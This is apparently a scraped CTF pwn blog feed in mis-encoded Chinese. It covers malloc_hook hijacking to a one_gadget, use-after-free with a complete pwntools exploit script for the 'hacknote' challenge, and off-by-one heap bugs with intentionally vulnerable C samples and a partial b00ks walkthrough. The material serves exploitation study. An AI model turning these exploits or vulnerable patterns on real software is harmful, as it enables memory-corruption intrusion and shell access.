class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;__libc_malloc&#x2F;*------------------------ Public wrappers. --------------------------------*&#x2F;void *__libc_malloc (size_t bytes)&#123;  mstate ar_ptr;  void *victim;  void *(*hook) (size_t, const void *)    &#x3D; atomic_forced_read (__malloc_hook);  if (__builtin_expect (hook !&#x3D; NULL, 0))    return (*hook)(bytes, RETURN_ADDRESS (0));  arena_get (ar_ptr, bytes);  victim &#x3D; _int_malloc (ar_ptr, bytes);  &#x2F;* Retry with another arena only if we were able to find a usable arena     before.  *&#x2F;  if (!victim &amp;&amp; ar_ptr !&#x3D; NULL)    &#123;      LIBC_PROBE (memory_malloc_retry, 1, bytes);      ar_ptr &#x3D; arena_get_retry (ar_ptr, bytes);      victim &#x3D; _int_malloc (ar_ptr, bytes);    &#125;  if (ar_ptr !&#x3D; NULL)    (void) mutex_unlock (&amp;ar_ptr-&gt;mutex);  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||          ar_ptr &#x3D;&#x3D; arena_for_chunk (mem2chunk (victim)));  return victim;&#125;libc_hidden_def (__libc_malloc)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;malloc ç›¸å…³å®å®šä¹‰&#x2F;*ç”³è¯·çš„å †å—å¯¹é½çš„å®å®šä¹‰*&#x2F;#ifndef MALLOC_ALIGNMENT# if !SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_16)&#x2F;* This is the correct definition when there is no past ABI to constrain it.   Among configurations with a past ABI constraint, it differs from   2*SIZE_SZ only on powerpc32.  For the time being, changing this is   causing more compatibility problems due to malloc_get_state and   malloc_set_state than will returning blocks not adequately aligned for   long double objects under -mlong-double-128.  *&#x2F;#  define MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)      \                                  ? __alignof__ (long double) : 2 *SIZE_SZ)# else#  define MALLOC_ALIGNMENT       (2 *SIZE_SZ)# endif#endif&#x2F;* The corresponding bit mask value *&#x2F;#define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="malloc-hookå‡½æ•°è§£æ"><a href="#malloc-hookå‡½æ•°è§£æ" class="headerlink" title="malloc_hookå‡½æ•°è§£æ"></a>malloc_hookå‡½æ•°è§£æ</h3><p>malloc_hookæ˜¯mallocçš„é’©å­å‡½æ•°ï¼Œåœ¨æ‰§è¡Œmallocæ—¶ï¼Œä¼šå…ˆæ£€æµ‹__malloc_hookçš„å€¼ï¼Œå¦‚æœmalloc_hookçš„å€¼å­˜åœ¨ï¼Œåˆ™æ‰§è¡Œè¯¥åœ°å€ï¼ˆå€¼é‡Œè¾¹è¡¨ç°ä¸ºåå…­è¿›åˆ¶ï¼Œå¯ä»¥æˆä¸ºåœ°å€ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬æˆåŠŸåŠ«æŒmalloc_hookä»¥åå¹¶ä¿®æ”¹å®ƒçš„å€¼ä¸ºone_gadgetï¼Œæˆ‘ä»¬å°±èƒ½getshell<br>å¹¶ä¸”åœ¨åŠ å…¥tcacheä¹‹åï¼Œä¸ä¼šå¯¹å¤§å°è¿›è¡Œæ£€æµ‹ï¼Œä½¿æˆ‘ä»¬æ›´å¥½åˆ©ç”¨å®ƒ</p><h3 id="åˆ©ç”¨èŒƒå›´"><a href="#åˆ©ç”¨èŒƒå›´" class="headerlink" title="åˆ©ç”¨èŒƒå›´"></a>åˆ©ç”¨èŒƒå›´</h3><p><strong>ç‰ˆæœ¬:Ubuntu18ï¼ˆåŠ å…¥äº†tcacheï¼Œæ— éœ€ä¼ªé€ sizeï¼‰â€”Ubuntu20.04</strong><br>å› ä¸º<strong>22.04åˆ å»äº†å‡ ä¹æ‰€æœ‰çš„é’©å­å‡½æ•°</strong>ï¼Œä½¿å¾—åŠ«æŒhookæˆä¸ºäº†ä¸å¯èƒ½ï¼Œæ‰€ä»¥å®ƒçš„è¯•ç”¨èŒƒå›´ä»…é™äº20.04ä¹‹å‰ï¼Œåœ¨æœªæ¥åº”è¯¥ä¼šé”€å£°åŒ¿è¿¹</p><p>å®ƒåœ¨å­¦å †ä¹‹åä¼°è®¡å°±æ˜¯æˆ‘ä»¬çš„è€æœ‹å‹çš„ï¼Œæˆ‘ä»¬<strong>å¸¸å¸¸èƒ½åœ¨å †é¢˜é‡Œçœ‹è§å¹¶åˆ©ç”¨å®ƒ</strong>ï¼Œä¸<strong>free_hookå’Œrelloc_hook</strong>ç®€ç›´æ˜¯ä¸‰å…„å¼Ÿ</p><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p><strong>ä¿®æ”¹chunk-&gt;fdæŒ‡å‘malloc_hook</strong>ï¼Œç„¶åæŠŠmalloc_hookç”³è¯·å‡ºæ¥<strong>æˆä¸ºfake_chunk</strong>ï¼Œå†<strong>ä¿®æ”¹fake_chunkçš„å€¼ä¸ºone_gadget</strong>ã€‚ä¿®æ”¹å®Œæ¯•åè®°å¾—<strong>æ ¡å‡†one_gadget</strong>ï¼Œæœ‰å¯èƒ½æ— æ³•ç”Ÿæ•ˆï¼Œæ¯•ç«Ÿå¯èƒ½ä¸æ»¡è¶³one_gadgetçš„ç”Ÿæ•ˆæ¡ä»¶</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> å † </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UAF(use_after_free)</title>
      <link href="/2025/03/10/UAF-use-after-free/"/>
      <url>/2025/03/10/UAF-use-after-free/</url>
      
        <content type="html"><![CDATA[<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>æˆ‘ä»¬å°†Use After Freeç¿»è¯‘è¿‡æ¥å°±æ˜¯é‡Šæ”¾åä½¿ç”¨ï¼šå½“ä¸€ä¸ªæŒ‡é’ˆæ‰€æŒ‡å‘çš„æŒ‡é’ˆå—è¢«é‡Šæ”¾æ‰ä¹‹åå¯ä»¥å†æ¬¡è¢«ä½¿ç”¨ï¼Œ<br>ä½†æ˜¯è¿™æ˜¯ç”±è¦æ±‚çš„ï¼Œä¸å¦¨å°†æ‰€æœ‰çš„æƒ…å†µåˆ—ä¸¾å‡ºæ¥ï¼š</p><ul><li><strong>chunkè¢«é‡Šæ”¾ä¹‹åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆè¢«è®¾ç½®ä¸ºNULL</strong>ï¼Œå¦‚æœå†æ¬¡ä½¿ç”¨å®ƒï¼Œç¨‹åºå°±ä¼šå´©æºƒã€‚</li><li><strong>chunkè¢«é‡Šæ”¾ä¹‹åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæœªè¢«è®¾ç½®ä¸ºNULL</strong>ï¼Œå¦‚æœåœ¨ä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰æ²¡æœ‰ä»£ç å¯¹è¿™å—å†…å­˜è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆå†æ¬¡ä½¿ç”¨è¿™ä¸ªæŒ‡é’ˆæ—¶ç¨‹åºå¾ˆæœ‰å¯èƒ½æ­£å¸¸è¿è½¬ã€‚</li><li><strong>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸ºNULL</strong>ï¼Œä½†æ˜¯åœ¨å®ƒä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œæœ‰ä»£ç å¯¹è¿™å—å†…å­˜è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆå½“ç¨‹åºå†æ¬¡ä½¿ç”¨è¿™å—å†…å­˜æ—¶ï¼Œå°±å¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°å¥‡æ€ªçš„é—®é¢˜ã€‚<br>åœ¨å †ä¸­Use After Freeä¸€èˆ¬æŒ‡çš„æ˜¯åä¸¤ç§æ¼æ´ï¼Œæˆ‘ä»¬<strong>ä¸€èˆ¬ç§°<em>è¢«é‡Šæ”¾åæ²¡æœ‰è¢«è®¾ç½®ä¸ºNULLçš„å†…å­˜æŒ‡é’ˆ</em>ä¸ºdangling pointer(æ‚¬ç©ºæŒ‡é’ˆã€æ‚¬å‚æŒ‡é’ˆ)</strong>ã€‚<blockquote><p>æœªè¢«åˆå§‹åŒ–è¿‡çš„å†…å­˜æŒ‡é’ˆç§°ä¸ºé‡æŒ‡é’ˆ</p></blockquote></li></ul><p><img src="/2025/03/10/UAF-use-after-free/Pasted image 20250309202934.png" alt="Pasted image 20250309202934"><br><img src="/2025/03/10/UAF-use-after-free/Pasted image 20250309222453.png" alt="Pasted image 20250309222453"><br><img src="/2025/03/10/UAF-use-after-free/Pasted image 20250309222509.png" alt="Pasted image 20250309222509"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import * r &#x3D; process(&#39;.&#x2F;hacknote&#39;)  def addnote(size, content):    r.recvuntil(&quot;:&quot;)    r.sendline(&quot;1&quot;)    r.recvuntil(&quot;:&quot;)    r.sendline(str(size))    r.recvuntil(&quot;:&quot;)    r.sendline(content) def delnote(idx):    r.recvuntil(&quot;:&quot;)    r.sendline(&quot;2&quot;)    r.recvuntil(&quot;:&quot;)    r.sendline(str(idx)) def printnote(idx):    r.recvuntil(&quot;:&quot;)    r.sendline(&quot;3&quot;)    r.recvuntil(&quot;:&quot;)    r.sendline(str(idx))  #gdb.attach(r)magic &#x3D; 0x08048986 addnote(20, &quot;note1&quot;) # add note 0addnote(20, &quot;note2&quot;) # add note 1 delnote(0) # delete note 0delnote(1) # delete note 1 addnote(8, p32(magic)) # add note 2 printnote(0) # print note 0r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> å † </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>chunk_extend</title>
      <link href="/2025/03/10/chunk-extend/"/>
      <url>/2025/03/10/chunk-extend/</url>
      
        <content type="html"><![CDATA[<h2 id="å¾…å¡«å‘"><a href="#å¾…å¡«å‘" class="headerlink" title="å¾…å¡«å‘"></a>å¾…å¡«å‘</h2>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å †ä¸­çš„off-by-one</title>
      <link href="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/"/>
      <url>/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>off-by-oneè¿™ç§æŠ€æœ¯ä¸ä»…ä»…é€‚ç”¨äºå †ï¼Œåœ¨æ ˆæº¢å‡ºä¸­ä¹Ÿå¯ä»¥å¾—åˆ°å¾ˆå¥½çš„åº”ç”¨ï¼Œç”±äºctfå¾ˆå–œæ¬¢åœ¨å †ä¸­å‡ºé¢˜ã€‚ä¸¥æ ¼æ¥è¯´off-by-oneæ¼æ´æ˜¯ä¸€ç§ç‰¹æ®Šçš„æº¢å‡ºæ¼æ´ï¼Œoff-by-oneæŒ‡ç¨‹åºå‘ç¼“å†²åŒºä¸­å†™å…¥æ—¶ï¼Œå†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªç¼“å†²åŒºæœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°å¹¶ä¸”åªè¶Šç•Œäº†ä¸€ä¸ªå­—èŠ‚</p><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>off-by-oneè¿™ç§æ¼æ´çš„å½¢æˆå’Œæ•´å½¢æº¢å‡ºå¾ˆç›¸ä¼¼ï¼Œå¾€å¾€éƒ½æ˜¯ç”±äºå¯¹è¾¹ç•Œçš„æ£€æŸ¥ä¸å¤Ÿä¸¥è°¨ï¼Œå½“ç„¶ä¹Ÿä¸æ’é™¤å’Œå†™å…¥çš„sizeæ­£å¥½å°±åªå¤šäº†ä¸€ä¸ªå­—èŠ‚çš„æƒ…å†µï¼Œè¾¹ç•ŒéªŒè¯ä¸ä¸¥è°¨é€šå¸¸æœ‰ä¸¤ç§æƒ…å†µï¼š</p><ul><li>ä½¿ç”¨å¾ªç¯è¯­å¥å‘å †å—ä¸­å†™å…¥æ•°æ®æ—¶ï¼Œå¾ªç¯çš„æ¬¡æ•°è®¾ç½®é”™è¯¯ï¼Œå¯¼è‡´å¤šå†™äº†ä¸€ä¸ªå­—èŠ‚ï¼Œåé¢ä¼šä¸¾ä¾‹è®²è§£</li><li>å¯¹å­—ç¬¦ä¸²é•¿åº¦åˆ¤æ–­æœ‰è¯¯<h3 id="ç®€ä¾‹"><a href="#ç®€ä¾‹" class="headerlink" title="ç®€ä¾‹"></a>ç®€ä¾‹</h3><h4 id="1-å¾ªç¯è¾¹ç•Œä¸ä¸¥è°¨"><a href="#1-å¾ªç¯è¾¹ç•Œä¸ä¸¥è°¨" class="headerlink" title="1.å¾ªç¯è¾¹ç•Œä¸ä¸¥è°¨"></a>1.å¾ªç¯è¾¹ç•Œä¸ä¸¥è°¨</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">int my_gets(char *ptr,int size)&#123;    int i;    for(i &#x3D; 0; i &lt;&#x3D; size; i++)    &#123;        ptr[i] &#x3D; getchar();    &#125;    return i;&#125;int main()&#123;    char *chunk1,*chunk2;    chunk1 &#x3D; (char *)malloc(16);    chunk2 &#x3D; (char *)malloc(16);    puts(&quot;Get Input:&quot;);    my_gets(chunk1, 16);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-å¯¹å­—ç¬¦ä¸²é•¿åº¦åˆ¤æ–­æœ‰è¯¯"><a href="#2-å¯¹å­—ç¬¦ä¸²é•¿åº¦åˆ¤æ–­æœ‰è¯¯" class="headerlink" title="2.å¯¹å­—ç¬¦ä¸²é•¿åº¦åˆ¤æ–­æœ‰è¯¯"></a>2.å¯¹å­—ç¬¦ä¸²é•¿åº¦åˆ¤æ–­æœ‰è¯¯</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">int main(void)&#123;    char buffer[40]&#x3D;&quot;&quot;;    void *chunk1;    chunk1&#x3D;malloc(24);    puts(&quot;Get Input&quot;);    gets(buffer);    if(strlen(buffer)&#x3D;&#x3D;24)    &#123;        strcpy(chunk1,buffer);    &#125;    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>è¿˜æ˜¯è®²ä¸€ä¸‹è¿™ä¸ª ä¾‹å­çš„æµç¨‹ï¼Œé¦–å…ˆåˆ›å»ºäº†ä¸€ä¸ª40å­—èŠ‚çš„å­—ç¬¦ä¸²bufferï¼Œç„¶ååˆåˆ›å»ºäº†ä¸€ä¸ª24å­—èŠ‚çš„å †chunk1ã€‚æ¥ç€ä»å¤–éƒ¨æ¥æ”¶å­—ç¬¦ä¸²å¹¶å­˜æ”¾åœ¨å­—ç¬¦ä¸²bufferä¸­ï¼Œç„¶ååˆ¤æ–­bufferä¸­çš„å­—ç¬¦ä¸²çš„é•¿åº¦æ˜¯å¦ä¸º24ä¸ªå­—èŠ‚ï¼Œå¦‚æœæ˜¯å°†è¿™æ®µå­—ç¬¦ä¸²æ”¾åœ¨å †ä¸­ã€‚å…¶å®ä¹ä¸€çœ‹æ¥å¹¶æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªéšå½¢çš„ä¸œè¥¿ï¼Œå°±æ˜¯ç»“æŸç¬¦\x00ã€‚<code>strcpyå‡½æ•°åœ¨æ‹·è´çš„æ—¶å€™ä¹Ÿä¼šå°†ç»“æŸç¬¦\x00å­˜å…¥å †å—ä¸­</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æƒ³chunk1ä¸­ä¸€å…±å†™äº†25ä¸ªå­—èŠ‚ï¼Œè¿™å°±å¯¼è‡´äº†chunk1æº¢å‡ºäº†ä¸€ä¸ªå­—èŠ‚<h2 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h2><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks</a><br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306141645.png" alt="Pasted image 20250306141645"></li></ul><p>sub_9F5<br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306150505.png" alt="Pasted image 20250306150505"><br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306150525.png" alt="Pasted image 20250306150525"><br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306150445.png" alt="Pasted image 20250306150445"><br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306144232.png" alt="Pasted image 20250306144232"><br>å…³é”®ç‚¹</p><ul><li>ä½œè€…åå­˜æ”¾åœ¨off_202018æŒ‡é’ˆä¸­ï¼Œè¿™ä¸ªæŒ‡é’ˆä¸€å…±32ä¸ªå­—èŠ‚</li><li>å›¾ä¹¦ç»“æ„ä½“æŒ‡é’ˆå­˜æ”¾åœ¨off_202010æŒ‡é’ˆä¸­</li><li>sub_9F5()å‡½æ•°å­˜åœ¨off-by-oneæ¼æ´ï¼Œåœ¨é¦–æ¬¡åˆ›å»ºä½œè€…åæˆ–ä¿®æ”¹ä½œè€…åçš„æ—¶å€™ï¼Œå¦‚æœå¡«å†™32ä¸ªå­—èŠ‚çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå°±ä¼šå¯¼è‡´\x00æº¢å‡ºåˆ°off_202018çš„ä½ä½</li></ul><p>è¾“å…¥ä»»æ„32ä¸ªå­—èŠ‚çš„å­—ç¬¦ä¸²å°†å­˜æ”¾ä½œè€…åçš„off_202018ç©ºé—´å¡«æ»¡<br>å°†ä»£ç æ®µèµ·å§‹åœ°å€åŠ ä¸Šoff_202018çš„åç§»å°±å¯ä»¥å¾—åˆ°å­˜æ”¾ä½œè€…ååœ°å€çš„æŒ‡é’ˆäº†ï¼š<br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306191120.png" alt="Pasted image 20250306191120"></p><p>å¯ä»¥çœ‹åˆ°0x55555575602010ä¸­å­˜æ”¾çš„å°±æ˜¯å›¾ä¹¦1çš„ç»“æ„ä½“æŒ‡é’ˆï¼Œç´§è·Ÿç€çš„å°±æ˜¯å›¾ä¹¦2çš„ç»“æ„ä½“æŒ‡é’ˆã€‚è¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬è¾“å…¥çš„ä½œè€…åä¹Ÿç´§ç´§åœ°è´´åœ¨ä¸¤ä¸ªç»“æ„ä½“æŒ‡é’ˆå‰é¢ï¼Œè¿™æ˜¯å› ä¸ºå­˜æ”¾è¿™ä¸¤ä¸ªä¸œè¥¿çš„off_202010å’Œoff_202018æ˜¯æŒ¨ç€çš„<br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306202108.png" alt="Pasted image 20250306202108"><br>ç”±äºä½œè€…åå’Œbook1ç»“æ„ä½“ç›¸è¿ï¼Œæ‰€ä»¥äº‹å®ä¸Šbook1ç»“æ„ä½“æŒ‡é’ˆçš„ä½ä½30å°†åŸæœ‰ä½œè€…åæº¢å‡ºçš„\x00è¦†ç›–æ‰äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬å¦‚æœæ‰“å°ä½œè€…åï¼Œæœ€åçš„\x00ä¹Ÿæ˜¯è¦è¾“å‡ºçš„ï¼Œä½†æ˜¯è¢«e0è¦†ç›–ä¹‹åe0ä¹Ÿä¼šè¢«æ‰“å°ï¼Œç”±äºe0æ˜¯book1ç»“æ„ä½“æŒ‡é’ˆçš„èµ·å§‹ä½ç½®ï¼Œé‚£ä¹ˆbook1ç»“æ„ä½“æŒ‡é’ˆä¹Ÿä¼šè¢«ä¸€èµ·æ‰“å°å‡ºæ¥ã€‚<br>ä¸¾ä¸ªæ —å­ï¼šä¸¤å¼ æ‰‘å…‹ç‰ŒAã€Bï¼Œç‰ŒAæ”¾åœ¨æ¡Œå­ä¸Šï¼Œç‰ŒBçš„è¾¹ç¼˜æ¶‚ä¸Šèƒ¶æ°´ï¼Œæ¥ç€å°†ç‰ŒBæœ‰èƒ¶æ°´çš„ä¸€é¢è¾¹ç¼˜æ”¾åœ¨ç‰ŒAçš„è¾¹ç¼˜ä½¿ä¸¤å¼ ç‰Œé»åœ¨ä¸€èµ·ï¼Œæœ€åä»æ¡Œå­ä¸Šæ‹¿èµ·ç‰ŒAï¼Œç”±äºAä¸Bç²˜åˆçš„åŸå› ï¼Œç‰ŒBä¹Ÿä¼šè·Ÿç€è¢«ä»æ¡Œå­ä¸Šæ‹¿èµ·</p><p>book1çš„ç»“æ„ä½“æŒ‡é’ˆ:<code>0x0000555555a02130</code><br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306204104.png" alt="Pasted image 20250306204104"></p><p>æ—¢ç„¶book1çš„ç»“æ„ä½“æŒ‡é’ˆä½ä½èƒ½å¤Ÿè¦†ç›–ä½œè€…åçš„\x00ï¼Œé‚£ä¹ˆä½œè€…åçš„\x00æ˜¯ä¸æ˜¯ä¹Ÿèƒ½å¤Ÿè¦†ç›–ç»“æ„ä½“æŒ‡é’ˆçš„ä½ä½å‘¢ï¼Ÿæ­£å¥½è¿™ä¸ªç¨‹åºè¿˜æœ‰ä¿®æ”¹ä½œè€…åçš„åŠŸèƒ½ï¼Œè€Œä¸”åœ¨å‰é¢idaåˆ†æçš„æ—¶å€™å‘ç°æ–°çš„ä½œè€…åä¾ç„¶è¿˜ä¼šå­˜æ”¾åœ¨202018çš„ä½ç½®ã€‚é‚£ä¹ˆæˆ‘ä»¬é¢„æƒ³ä¸€ä¸‹book1çš„ç»“æ„ä½“æŒ‡é’ˆæ˜¯0x0000555555a020e0é‚£ä¹ˆè¢«è¦†ç›–ä¹‹åå°±ä¼šå˜æˆ0x0000555555a02000</p><p><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306205146.png" alt="Pasted image 20250306205146"><br>å¯ä»¥çœ‹åˆ°book1åŸæœ‰çš„ç»“æ„ä½“æŒ‡é’ˆ0x0000555555a020e0è¢«\x00è¦†ç›–æˆäº†0x0000555555a02000ï¼Œç°åœ¨æ‹¿å‡ºä½ çš„è®°äº‹æœ¬ï¼Œ0x0000555555a020b0çš„ä½ç½®å°±æ˜¯åˆšæ‰book1_descçš„ä½ç½®ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆè¦å°†book1_nameè®¾ç½®æˆ128çš„åŸå› 